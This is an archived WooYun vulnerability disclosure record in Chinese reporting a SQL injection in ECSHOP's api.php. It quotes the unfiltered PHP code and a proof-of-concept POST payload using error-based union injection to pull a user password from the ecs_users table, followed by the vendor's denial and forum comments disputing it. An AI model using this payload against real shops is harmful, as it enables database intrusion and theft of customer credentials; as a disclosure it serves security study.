{"id": 3694, "wybug_id": "wooyun-2014-053611", "wybug_title": "ECSHOP最新版SQL注入漏洞", "wybug_corp": "ShopEx", "wybug_author": "felixk3y", "wybug_date": "2014-03-14 14:47", "wybug_open_date": "2014-06-09 14:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-09：\t细节向公众公开  简要描述： 昨天上午没事，闲着 下载了最新版的ecshop 想挑战挑战自己...下午 客服美眉打电话来,询问下载ECSHOP的目的，哈哈.. 别说 声音挺甜的...为了抢我的IPAD ，看来还必须赚RANK啊... 详细说明：  注：需要网店店主权限#1 漏洞代码这个漏洞比较简单，也许是开发人员疏忽了吧...\nif (is_numeric($_POST['last_modify_st_time']) && is_numeric($_POST['last_modify_en_time']))    {        $sql = 'SELECT COUNT(*) AS count' .               ' FROM ' . $GLOBALS['ecs']->table('goods') .               \" WHERE is_delete = 0 AND is_on_sale = 1 AND (last_update > '\" . $_POST['last_modify_st_time'] . \"' OR last_update = 0)\";        $date_count = $GLOBALS['db']->getRow($sql);        if (empty($date_count))        {            api_err('0x003', 'no data to back');    //无符合条件数据        }        $page = empty($_POST['pages']) ? 1 : $_POST['pages'];       //确定读取哪些记录        $counts = empty($_POST['counts']) ? 100 : $_POST['counts']; //我肋个去，这里居然没过滤...        $sql = 'SELECT goods_id, last_update AS last_modify' .               ' FROM ' . $GLOBALS['ecs']->table('goods') .               \" WHERE is_delete = 0 AND is_on_sale = 1 AND (last_update > '\" . $_POST['last_modify_st_time'] . \"' OR last_update = 0)\".               \" LIMIT \".($page - 1) * $counts . ', ' . $counts;//我肋个天，居然就这样带入了sql语句...        //exit($sql);        $date_arr = $GLOBALS['db']->getAll($sql);//OH! My god，居然就这样直接查询了...\n在这段代码中，POST过来的counts参数\n$counts = empty($_POST['counts']) ? 100 : $_POST['counts'];\n可以看出来，这里没有经过任何的过滤，接着往下看\n$sql = 'SELECT goods_id, last_update AS last_modify' .               ' FROM ' . $GLOBALS['ecs']->table('goods') .               \" WHERE is_delete = 0 AND is_on_sale = 1 AND (last_update > '\" . $_POST['last_modify_st_time'] . \"' OR last_update = 0)\".               \" LIMIT \".($page - 1) * $counts . ', ' . $counts;//我肋个天，居然就这样带入了sql语句...\n看见了没有，我肋个天，居然就这样带入了sql语句...后面直接执行了...\n$date_arr = $GLOBALS['db']->getAll($sql);\n#2 漏洞利用这个漏洞比较简单，下面给出漏洞利用POCStep1 访问：http://www.secmap.cn/ecshop/api.php同时POST提交\nac=true&act=search_goods_list&last_modify_st_time=111&last_modify_en_time=1&api_version=1.0&pages=1&counts=1 union select count(*)  from (select 1 union select null union select !1)x group by  concat((select password from ecs_users limit 1),floor(rand(0)*2)) -- s\n结果报错了，如图：\n\n   漏洞证明：  #3 漏洞证明\ncounts=1 union select user(),version()#23\n\n\n   修复方案：  过滤，同时请注意细节问题，希望以后别再出这样低级的错误，谢谢。   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-09 14:47 厂商回复： 非常感谢您为shopex信息安全做的贡献 该问题经过测试不存在，对于API操作做过验证谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-14 14:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我草    \n     2014-03-14 14:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  要火    \n     2014-03-14 14:52 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @felixk3y 你咋回答的？    \n     2014-03-14 14:56 |    \t\t马燕羊蝎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:10        | 亲，啥时候请吃马燕羊蝎子。)\t\t \n  那个谁，买跳蛋的信息要泄露了。    \n     2014-03-14 15:00 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  1WWWWWWWWWWWWWWWA    \n     2014-03-14 15:07 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。洞主这漏洞可以买3个ipad了。。。    \n     2014-03-14 15:16 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  关注    \n     2014-03-14 15:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  厂商确认不存在?    \n     2014-03-14 16:09 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @xsser 是存在肯定的，刚翻了下google 原来这个洞早在2010年就爆过，不知道为什么到现在都还没修复。    \n     2014-03-14 16:09 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  api 注入之前不是包过了吗？    \n     2014-03-14 16:39 |    \t\t东方的肚皮舞 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 社区变了。)\t\t \n  我的钱    \n     2014-03-14 16:39 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  @felixk3y 去后台打全补丁了吗    \n     2014-03-14 16:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @pandas 下最新版也有问题    \n     2014-03-14 16:46 |    \t\tShopEx(乌云厂商)\t\t \n  @xsser 在API操作前有做过check_auth验证    \n     2014-03-14 16:49 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @ShopEx 这个auth要求什么权限    \n     2014-03-14 17:01 |    \t\tShopEx(乌云厂商)\t\t \n  @xsser 需要POST token    \n     2014-03-14 17:08 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  http://www.vfocus.net/art/20101116/8254.html看来是这个了    \n     2014-03-14 17:17 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @pandas @xsser 不是这个？ WooYun: ecshop2.73 api.php 两处鸡肋注入    \n     2014-03-14 17:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  失误啊    \n     2014-03-15 00:16 |    \t\t白狼 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 黑客五项我通了四项)\t\t \n  不存在。。。。。。。    \n     2014-03-17 10:50 |    \t\tkelon \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        )\t\t \n  check_auth 要这个啊    \n     2014-07-03 18:36 |    \t\t老黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:61        | 最爱红颜不老。)\t\t \n  根本不存在这洞  新版本早没了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}